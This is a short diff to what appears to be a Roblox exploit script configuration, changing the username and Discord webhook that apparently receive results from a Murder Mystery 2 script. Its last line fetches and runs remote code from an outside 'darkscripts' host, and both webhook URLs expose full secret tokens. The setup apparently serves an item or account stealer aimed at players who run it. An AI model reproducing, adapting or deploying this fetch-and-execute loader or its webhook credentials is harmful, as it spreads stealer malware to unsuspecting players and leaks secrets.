@@ -1,4 +1,4 @@
-Username = "superkyetiberius0814"
-Webhook = "https://discord.com/api/webhooks/1288304140380012625/IXn7susCbUdJbpdUx9Aps3EWA1nnrLiJ9euuorCmQQGrp49Xdc0gHDQNyl7FD31wVRKO"
+Username = "Xvlamer"
+Webhook = "https://discord.com/api/webhooks/1314435460092657710/VlY5z-oWfCGCrS_rALWaHFBlVB6Uk-QtU0mkutNAGvAJ_XU9Cs6zBTa0gjoPMbhrlhju"
 
 loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
